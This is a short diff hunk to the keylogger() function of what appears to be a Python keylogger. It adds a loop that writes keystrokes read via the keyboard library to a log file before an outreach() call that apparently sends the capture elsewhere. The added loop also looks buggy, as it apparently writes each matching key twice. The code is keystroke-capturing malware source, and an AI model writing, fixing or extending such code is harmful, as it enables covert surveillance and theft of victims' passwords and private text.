@@ -36,7 +36,11 @@ def keylogger():
 
         if event.event_type == keyboard.KEY_DOWN:
             char = keyboard.read_key()
-
+            
+            for i in allchars:
+                if char == i:
+                    file.write(char)
+            
             file.write(char)
             file.close()
             outreach()
